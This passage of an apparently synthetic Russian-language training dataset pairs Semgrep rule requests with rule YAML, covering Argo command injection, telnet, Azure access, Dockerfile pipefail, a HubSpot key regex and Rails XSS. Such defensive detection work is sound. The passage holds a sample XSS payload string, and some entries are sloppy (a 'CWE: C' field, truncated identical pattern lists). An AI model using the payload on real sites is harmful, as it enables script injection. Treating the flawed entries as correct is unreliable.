ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:argo-workflow-parameter-command-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: argo-workflow-parameter-command-injection\n    message: Using input or workflow parameters in here-scripts can lead to command injection or code injection. Convert the parameters to env variables instead.\n    languages: [yaml]\n    metadata:\n      category: security\n      cwe: \n        - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n        - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n      owasp: \n        - A03:2021 – Injection\n      confidence: MEDIUM\n      likelihood: MEDIUM\n      impact: HIGH\n      subcategory:\n        - vuln\n      references:\n        - https://github.com/argoproj/argo-workflows/issues/5061\n        - https://github.com/argoproj/argo-workflows/issues/5114#issue-808865370\n      technology:\n        - ci\n        - argo\n    severity: ERROR\n    patterns:\n      - pattern-inside: |\n          apiVersion: $VERSION\n          ...\n      - metavariable-regex:\n          metavariable: $VERSION\n          regex: (argoproj.io.*)\n      - pattern-either:\n          - patterns:\n            - pattern-inside: |\n                command:\n                  ...\n                  - $LANG\n                  ...\n                ...\n                source:\n                  $SCRIPT\n            - metavariable-regex:\n                metavariable: $LANG\n                regex: .*(sh|bash|ksh|csh|tcsh|zsh|python|python3|node|perl|ruby|php|lua|awk|sed|powershell|fish|dash|R|grooby|scala|clj|elixir|coffee|dart|haskell|ocaml).*\n            - metavariable-pattern:\n                metavariable: $SCRIPT\n                pattern-either:\n                  - pattern-regex: (.*{{.*inputs.parameters.*}}.*)\n                  - pattern-regex: (.*{{.*workflow.parameters.*}}.*)\n            - focus-metavariable: $SCRIPT\n          - patterns:\n            - pattern-either:\n              - pattern-inside: |\n                  container:\n                    ...\n                    command: $LANG\n                    ...\n                    args: $PARAM\n              - pattern-inside: |\n                  containerSet:\n                    ...\n                    containers:\n                      - ...\n                        command: $LANG\n                        ...\n                        args: $PARAM\n            - metavariable-regex:\n                metavariable: $LANG\n                regex: .*(sh|bash|ksh|csh|tcsh|zsh|python|python3|node|perl|ruby|php|lua|awk|sed|powershell|fish|dash|R|grooby|scala|clj|elixir|coffee|dart|haskell|ocaml).*\n            - metavariable-pattern:\n                metavariable: $PARAM\n                pattern-either:\n                  - pattern-regex: (.*{{.*inputs.parameters.*}}.*)\n                  - pattern-regex: (.*{{.*workflow.parameters.*}}.*)\n            - focus-metavariable: $PARAM\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования входных параметров или параметров рабочего процесса непосредственно в here-скриптах (командах оболочки) внутри YAML-файлов Argo Workflow. Здесь обнаруживаются два типа шаблонов: команды с параметром 'command' и аргументы с параметром 'args'. В обоих случаях используется регулярное выражение для поиска строк, содержащих переменные {{inputs.parameters.message}} или {{workflow.parameters.message}}, которые могут быть подвержены командным инъекциям. Правило также учитывает различные языки сценариев и оболочки, такие как bash, sh, python и другие.\n\n# Ключевые элементы:\n- ID: argo-workflow-parameter-command-injection\n- Язык: yaml \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "argo-workflow-parameter-command-injection",
      "language": "yaml",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: telnet-request\nОписание уязвимости: Checks for attempts to connect to an insecure telnet server using the package telnet. This is bad because it can lead to man in the middle attacks.\nCWE: C\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: telnet-request.go\nfunc bad1() {\n    var caller telnet.Caller = telnet.StandardCaller\n\n\t// ruleid: telnet-request\n\ttelnet.DialToAndCall(\"example.net:23\", caller)\n}\n\nfunc ok1() {\n\ttlsConfig := &tls.Config{}\n\n\tvar caller telnet.Caller = telnet.StandardCaller\n\n\t// ok: telnet-request\n\ttelnet.DialToAndCallTLS(\"example.net:992\", caller, tlsConfig)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• telnet.DialToAndCall(\"example.net:23\", telnet.StandardCaller)\n• telnet.DialToAndCall(\".\", telnet.StandardCaller)\n\nБезопасные паттерны:  \n• telnet.DialToAndCallTLS(\"example.net:992\", telnet.StandardCaller, tlsConfig)\n• telnet.DialToAndCallTLS(...)\n\nЛегенда аннотаций:\n- // ruleid:telnet-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:telnet-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: telnet-request\n  message: >-\n    Checks for attempts to connect to an insecure telnet server using the package telnet.\n    This is bad because it can lead to man in the middle attacks.\n  severity: WARNING\n  metadata:\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://godoc.org/github.com/reiver/go-telnet\n    subcategory:\n    - vuln\n    technology:\n    - go-telnet\n    vulnerability: Insecure Transport\n  languages:\n  - go\n  pattern: |\n    telnet.DialToAndCall(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции telnet.DialToAndCall(...) без использования TLS конфигурации. Паттерн ищет точное совпадение имени функции и игнорирует аргументы внутри скобок. Пример опасного кода демонстрирует прямое использование telnet.DialToAndCall(...) без указания TLS конфигурации, что является небезопасным поведением. Безопасный пример показывает аналогичную функцию, но с указанием TLS конфигурации, что предотвращает возможные атаки типа \"человек посередине\".\n\n# Ключевые элементы:\n- ID: telnet-request\n- Язык: go \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "telnet-request",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения metadata-owasp\nОписание уязвимости: The `owasp` tag in Semgrep rule metadata should start with the format \"A00:YYYY\", where A00 is the OWASP top ten number and YYYY is the OWASP top ten year.\nCWE: \nТип анализа: search\nЯзык: json",
    "input": "Требования:\n- Язык: json\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: metadata-owasp.test.yaml\nrules:\n  - id: example-1\n    message: Example\n    severity: ERROR\n    languages: [json, yaml]\n    pattern: \"...\"\n    metadata:\n      # ok: metadata-owasp\n      owasp: \"A1: Some Vulnerability\"\n  - id: example-2\n    message: Example\n    severity: ERROR\n    languages: [json, yaml]\n    pattern: \"...\"\n    metadata:\n      # ruleid: metadata-owasp\n      owasp: \"A11: Some Vulnerability\"\n  - id: example-3\n    message: Example\n    severity: ERROR\n    languages: [json, yaml]\n    pattern: \"...\"\n    metadata:\n      # ruleid: metadata-owasp\n      owasp: a4\n  - id: example-4\n    message: Example\n    severity: ERROR\n    languages: [json, yaml]\n    pattern: \"...\"\n    metadata:\n      # ruleid: metadata-owasp\n      owasp: A5 Some Vulnerability\n  - id: example-5\n    message: Example\n    severity: ERROR\n    languages: [json, yaml]\n    pattern: \"...\"\n    metadata:\n      # ok: metadata-owasp\n      owasp:\n        # ok: metadata-owasp\n        - A05:2021 - Security Misconfiguration\n        # ok: metadata-owasp\n        - A06:2017 - Security Misconfiguration\n  - id: example-6\n    message: Example\n    severity: ERROR\n    languages: [json, yaml]\n    pattern: \"...\"\n    metadata:\n      # ok: metadata-owasp\n      owasp:\n        # ruleid: metadata-owasp\n        - A5:2021 - Security Misconfiguration\n        # ruleid: metadata-owasp\n        - A06:201789 - Security Misconfiguration  # Ограничиваем длину\n\nОпасные паттерны:\n• owasp: \"A11: Some Vulnerability\"\n• owasp: a4\n• owasp: A5 Some Vulnerability\n\nБезопасные паттерны:  \n• owasp: \"A1: Some Vulnerability\"\n• owasp:\n  - A05:2021 - Security Misconfiguration\n  - A06:2017 - Security Misconfiguration\n\nЛегенда аннотаций:\n- // ruleid:metadata-owasp: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:metadata-owasp: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: metadata-owasp\n  message: >-\n    The `owasp` tag in Semgrep rule metadata should start with the format \"A00:YYYY\", where A00 is the\n    OWASP top ten number and YYYY is the OWASP top ten year.\n  severity: ERROR\n  metadata:\n    category: best-practice\n    technology:\n    - semgrep\n  languages: [json, yaml]\n  patterns:\n  - pattern-inside: 'rules: ...'\n  - pattern-inside: 'metadata: ...'\n  - pattern-either:\n    - patterns:\n      - pattern: 'owasp: \"...\"'\n      - pattern-not: 'owasp: \"=~/^A(0?[1-9]|10): .+$/\"'\n    - patterns:\n      - pattern-inside: 'owasp: [...]'\n      - pattern: '\"$ANYTHING\"'\n      - pattern-not-regex: .*A[01][0-9]:[0-9]{4}\\s+.*\n      - pattern-not-regex: 'owasp:'\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска метаданных правил Semgrep, где тег owasp указан некорректно. Анализ выполняется путем поиска ключевых слов внутри структуры rules и metadata. Правило проверяет формат owasp-тега, который должен начинаться с 'A00:YYYY', где A00 — номер OWASP топ-10, а YYYY — год выпуска OWASP топ-10. Используются шаблоны pattern-inside для поиска внутри блоков rules и metadata, а также pattern-either для проверки либо строкового формата owasp, либо списка owasp. Негативные условия pattern-not и pattern-not-regex исключают корректные форматы owasp.\n\n# Ключевые элементы:\n- ID: metadata-owasp\n- Язык: json \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "metadata-owasp",
      "language": "json",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: azure-search-publicnetwork-access-disabled\nОписание уязвимости: Ensure that Azure Cognitive Search disables public network access\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-search-publicnetwork-access-disabled.tf\n# fail\n# ruleid: azure-search-publicnetwork-access-disabled\nresource \"azurerm_search_service\" \"example\" {\n    name                = \"example-search-service\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n    sku                 = \"standard\"\n    public_network_access_enabled = true\n}\n\n# fail\n# ruleid: azure-search-publicnetwork-access-disabled\nresource \"azurerm_search_service\" \"example\" {\n    name                = \"example-search-service\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n    sku                 = \"standard\"\n}\n\n# pass\nresource \"azurerm_search_service\" \"example\" {\n    name                = \"example-search-service\"\n    resource_group_name = azurerm_resource_group.example.name\n    location            = azurerm_resource_group.example.location\n    sku                 = \"standard\"\n    public_network_access_enabled = false\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_search_service\" \"example\" { \n    name = \"example-search-service\"\n    resource_group_name = azurerm_resource_group.example.name\n    location = azurerm_resource_group.example.location\n\n• resource \"azurerm_search_service\" \"example\" { \n    name = \"example-search-service\"\n    resource_group_name = azurerm_resource_group.example.name\n    location = azurerm_resource_group.example.location\n\n\nБезопасные паттерны:  \n• resource \"azurerm_search_service\" \"example\" { \n    name = \"example-search-service\"\n    resource_group_name = azurerm_resource_group.example.name\n    location = azurerm_resource_group.example.location\n\n\nЛегенда аннотаций:\n- // ruleid:azure-search-publicnetwork-access-disabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-search-publicnetwork-access-disabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-search-publicnetwork-access-disabled\n  message: >-\n    Ensure that Azure Cognitive Search disables public network access\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"azurerm_search_service\" \"...\" {\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"azurerm_search_service\" \"...\" {\n      ...\n      public_network_access_enabled = false\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов типа 'azurerm_search_service' в конфигурационном файле Terraform (HCL). Правило проверяет наличие параметра 'public_network_access_enabled', который должен быть установлен в значение 'false'. Если этот параметр отсутствует или имеет значение 'true', правило считает это опасным примером. Безопасный пример включает явное указание 'public_network_access_enabled = false'.\n\n# Ключевые элементы:\n- ID: azure-search-publicnetwork-access-disabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-search-publicnetwork-access-disabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: set-pipefail\nОписание уязвимости: Only the exit code from the final command in this RUN instruction will be evaluated unless 'pipefail' is set. If you want to fail the command at any stage in the pipe, set 'pipefail' by including 'SHELL [\"/bin/bash\", \"-o\", \"pipefail\", \"-c\"] before the command. If you're using alpine and don't have bash installed, communicate this explicitly with `SHELL [\"/bin/ash\"]`.\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: set-pipefail.dockerfile\n# cf. https://github.com/hadolint/hadolint/wiki/DL4006\n\nFROM debian:jesse\n\n# ruleid: set-pipefail\nRUN wget -O - https://some.site | wc -l > /number\n\n# ruleid: set-pipefail\nRUN apt-get update || apt-get install something || apt-get clean\n\n# ok: set-pipefail\nSHELL [\"/bin/bash\", \"-o\", \"pipefail\", \"-c\"]\nRUN wget -O - https://some.site | wc -l > /number\n\n# ok: set-pipefail\nSHELL [\"/bin/ash\", \"-o\", \"pipefail\", \"-c\"]\nRUN wget -O - https://some.site | wc -l > /number  # Ограничиваем длину\n\nОпасные паттерны:\n• RUN wget -O - https://some.site | wc -l > /number\n• RUN apt-get update || apt-get install something || apt-get clean\n\nБезопасные паттерны:  \n• SHELL [\"/bin/bash\", \"-o\", \"pipefail\", \"-c\"]\nRUN wget -O - https://some.site | wc -l > /number\n• SHELL [\"/bin/ash\", \"-o\", \"pipefail\", \"-c\"]\nRUN wget -O - https://some.site | wc -l > /number\n\nЛегенда аннотаций:\n- // ruleid:set-pipefail: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:set-pipefail: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: set-pipefail\n    languages: [dockerfile]\n    message: >-\n      Only the exit code from the final command in this RUN instruction will be evaluated unless 'pipefail' is set.\n      If you want to fail the command at any stage in the pipe, set 'pipefail' by including 'SHELL [\"/bin/bash\", \"-o\", \"pipefail\", \"-c\"] before the command.\n      If you're using alpine and don't have bash installed, communicate this explicitly with `SHELL [\"/bin/ash\"]`.\n    metadata:\n      references:\n        - https://github.com/hadolint/hadolint/wiki/DL4006\n      source-rule-url: https://github.com/hadolint/hadolint/wiki/DL4006\n      category: best-practice\n      technology:\n        - dockerfile\n    patterns:\n      - pattern-either:\n          - pattern: RUN ... | ...\n          - pattern: RUN ... || ...\n      - pattern-not-inside: |\n          SHELL [..., \"pipefail\", ...]\n          ...\n          RUN ... | ...\n      - pattern-not-inside: |\n          SHELL [\"/bin/ash\", ...]\n          ...\n          RUN ... | ...\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска Dockerfile инструкций RUN, которые используют конвейеры (`|` или `||`) без предварительного указания опции 'pipefail'. Опция 'pipefail' должна быть установлена перед конвейером, чтобы обеспечить прекращение выполнения команды при первой ошибке в конвейере. Правило использует комбинацию шаблонов, проверяющих наличие конвейеров и отсутствие установки 'pipefail' внутри инструкции SHELL.\n\n# Ключевые элементы:\n- ID: set-pipefail\n- Язык: dockerfile \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "set-pipefail",
      "language": "dockerfile",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detect-gemini\nОписание уязвимости: Possibly found usage of AI: Gemini\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-gemini.py\n# ruleid: detect-gemini\nimport google.generativeai as genai\nimport os\n\ngenai.configure(api_key=os.environ[\"API_KEY\"])\n\nmodel = genai.GenerativeModel('gemini-1.5-flash')  # Ограничиваем длину\n\nОпасные паттерны:\n• import google.generativeai\nimport os\ngenai.configure(api_key=os.environ[\"API_KEY\"])\nmodel = genai.GenerativeModel('gemini-1.5-flash')\n• from google.generativeai import *\ngenai.configure(api_key=os.environ['API_KEY'])\nmodel = genai.GenerativeModel('gemini-1.5-flash')\n\nБезопасные паттерны:  \n• import google\nprint(google.__version__)\n• import os\nprint(os.environ)\n\nЛегенда аннотаций:\n- // ruleid:detect-gemini: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-gemini: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-gemini\n    languages:\n      - python\n    severity: INFO\n    message: \"Possibly found usage of AI: Gemini\"\n    pattern-either:\n      - pattern: import google.generativeai\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможного использования библиотеки Google Generative AI (google.generativeai) в Python-коде. Тип анализа — поиск (search). Правило использует шаблон 'pattern' для выявления импорта модуля 'google.generativeai', что может указывать на потенциальное применение модели искусственного интеллекта Gemini. Шаблон задан с использованием оператора 'pattern', который ищет точное совпадение строки 'import google.generativeai'. Пример опасного кода включает явный импорт этого модуля, тогда как безопасный код не содержит такого импорта.\n\n# Ключевые элементы:\n- ID: detect-gemini\n- Язык: python \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-gemini",
      "language": "python",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения hubspot-api-key\nОписание уязвимости: A gitleaks hubspot-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: hubspot-api-key.js\n// ruleid: hubspot-api-key\nconst hubspotKey = \"12345678-ABCD-ABCD-ABCD-1234567890AB\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: hubspot-api-key.js\n// ruleid: hubspot-api-key\nconst hubspotKey = \"12345678-ABCD-ABCD-ABCD-1234567890AB\"\n• // File: another-hubspot-api-key.js\n// ruleid: hubspot-api-key\nlet hubspotApiToken = \"98765432-BCDE-BCDE-BCDE-9876543210EF\"\n\nБезопасные паттерны:  \n• // File: safe-hubspot-api-key.js\nconst apiKey = process.env.HUBSPOT_API_KEY\n• // File: secure-hubspot-api-key.js\nlet accessToken = getSecurelyRetrievedHubspotAccessToken()\n\nЛегенда аннотаций:\n- // ruleid:hubspot-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:hubspot-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: hubspot-api-key\n  message: A gitleaks hubspot-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:hubspot)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного ключа API HubSpot в JavaScript-коде. Регулярное выражение ищет строку, содержащую слово 'hubspot' в любом регистре, за которым следует произвольная последовательность символов длиной от 0 до 20, после чего идет оператор сравнения или присваивания ('=', ':', '|:', '<=' и др.) и далее шестнадцатеричный UUID, представляющий собой ключ API HubSpot.\n\n# Ключевые элементы:\n- ID: hubspot-api-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "hubspot-api-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: gcp-gke-has-labels\nОписание уязвимости: Ensure Kubernetes Clusters are configured with Labels\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-gke-has-labels.tf\n# fail\n# ruleid: gcp-gke-has-labels\nresource \"google_container_cluster\" \"fail1\" {\n    name = \"my-gke-cluster\"\n    location = \"us-central1\"\n    remove_default_node_pool = True\n    initial_node_count = 1\n    logging_service = \"none\"\n}\n\n# fail\n# ruleid: gcp-gke-has-labels\nresource \"google_container_cluster\" \"fail2\" {\n    name = \"my-gke-cluster\"\n    location = \"us-central1\"\n    remove_default_node_pool = True\n    initial_node_count = 1\n    logging_service = \"none\"\n    resource_labels = {}\n}\n\n# ok: gcp-gke-has-labels\nresource \"google_container_cluster\" \"success\" {\n    name = \"my-gke-cluster\"\n    location = \"us-central1\"\n    remove_default_node_pool = True\n    initial_node_count = 1\n    logging_service = \"none\"\n    resource_labels = {\n        \"Owner\" = \"value\"\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_container_cluster\" \"fail1\" { ... resource_labels = {} }\n• resource \"google_container_cluster\" \"fail2\" { ... resource_labels = {} }\n\nБезопасные паттерны:  \n• resource \"google_container_cluster\" \"success\" { ... resource_labels = { \"Owner\" = \"value\" } }\n\nЛегенда аннотаций:\n- // ruleid:gcp-gke-has-labels: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-gke-has-labels: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-gke-has-labels\n  patterns:\n    - pattern: resource\n    - pattern-inside: |\n          resource \"google_container_cluster\" \"...\" {\n          ...\n          }\n    - pattern-not-inside: |\n          resource \"google_container_cluster\" \"...\" {\n          ...\n          resource_labels = {\n              \"...\" = \"...\"\n          }\n          ...\n          }\n  message: >-\n    Ensure Kubernetes Clusters are configured with Labels\n  metadata:\n    category: best-practice\n    technology:\n      - terraform\n      - gcp\n  languages: [hcl]\n  severity: WARNING\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Google Kubernetes Engine (GKE) кластеров, которые не содержат меток (labels). Анализ выполняется путем поиска ресурса типа 'google_container_cluster' в HCL-коде. Правило проверяет наличие блока 'resource_labels', который содержит хотя бы одну пару ключ-значение. Если такой блок отсутствует или пустой, правило отмечает код как опасный. Безопасным считается случай, когда ресурс имеет непустой блок 'resource_labels'.\n\n# Ключевые элементы:\n- ID: gcp-gke-has-labels\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-gke-has-labels",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения avoid-render-text\nОписание уязвимости: 'render text: ...' actually sets the content-type to 'text/html'. If external data can reach here, this exposes your application to cross-site scripting (XSS) attacks. Instead, use 'render plain: ...' to render non-HTML text.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-render-text.rb\n# cf. https://github.com/rails/rails/blob/939fe523126198d43ecedeacc05dd7fdb1eae3d9/actionpack/test/controller/action_pack_assertions_test.rb\n\n\n# frozen_string_literal: true\n\nrequire \"abstract_unit\"\nrequire \"controller/fake_controllers\"\n\nclass ActionPackAssertionsController < ActionController::Base\n  def nothing() head :ok end\n\n  # ok: avoid-render-text\n  def hello_xml_world() render template: \"test/hello_xml_world\"; end\n\n  def assign_this\n    @howdy = \"ho\"\n    render inline: \"Mr. Henke\"\n  end\n\n  def render_based_on_parameters\n    # ok: avoid-render-text\n    render plain: \"Mr. #{params[:name]}\"\n  end\n\n  def render_url\n    # ok: avoid-render-text\n    render html: \"<div>#{url_for(action: 'flash_me', only_path: true)}</div>\"\n  end\n\n  def render_text_with_custom_content_type\n    # ok: avoid-render-text\n    render body: \"Hello!\", content_type: Mime[:rss]\n  end\n\n  def session_stuffing\n    session[\"xmas\"] = \"turkey\"\n    # ruleid: avoid-render-text\n    render text: \"ho ho ho\"\n  end\n\n  def raise_exception_on_get\n    raise \"get\" if request.get?\n    # ruleid: avoid-render-text\n    render text: \"request method: #{request.env['REQUEST_METHOD']}\"\n  end\n\n  def raise_exception_on_post\n    raise \"post\" if request.post?\n    # ok: avoid-render-text\n    render plain: \"request method: #{request.env['REQUEST_METHOD']}\"\n  end\n\n  def render_file_absolute_path\n    # ok: avoid-render-text\n    render file: File.expand_path(\"../../README.rdoc\", __dir__)\n  end\n\n  def render_file_relative_path\n    # ok: avoid-render-text\n    render file: \"README.rdoc\"\n  end\nend\n\n# Used to test that assert_response includes the exception message\n# in the failure message when an action raises and assert_response\n# is expecting something other than an error.\nclass AssertResponseWithUnexpectedErrorController < ActionController::Base\n  def index\n    raise \"FAIL\"\n  end\n\n  def show\n    # ok: avoid-render-text\n    render plain: \"Boom\", status: 500\n  end\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• render text: \"<script>alert('XSS');</script>\"\n• render text: params[:input]\n\nБезопасные паттерны:  \n• render plain: \"This is safe text\"\n• render inline: \"Safe HTML content\"\n\nЛегенда аннотаций:\n- // ruleid:avoid-render-text: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-render-text: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-render-text\n  metadata:\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_render_inline.rb\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    references:\n    - https://brakemanpro.com/2017/09/08/cross-site-scripting-in-rails#inline-renders---even-worse-than-xss\n    category: security\n    technology:\n    - rails\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  message: >-\n    'render text: ...' actually sets the content-type to 'text/html'.\n    If external data can reach here, this exposes your application\n    to cross-site scripting (XSS) attacks. Instead, use 'render plain: ...' to\n    render non-HTML text.\n  languages: [ruby]\n  severity: WARNING\n  pattern: 'render text: ...'\n  fix-regex:\n    regex: 'text:'\n    replacement: 'plain:'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода 'render text:' в Ruby/Rails, который устанавливает заголовок Content-Type равным 'text/html'. Если внешние данные могут достичь этого места, приложение становится подверженным атакам XSS. Правило ищет точное совпадение шаблона 'render text: ...' и предлагает замену на 'render plain: ...' для предотвращения XSS.\n\n# Ключевые элементы:\n- ID: avoid-render-text\n- Язык: ruby \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-render-text",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
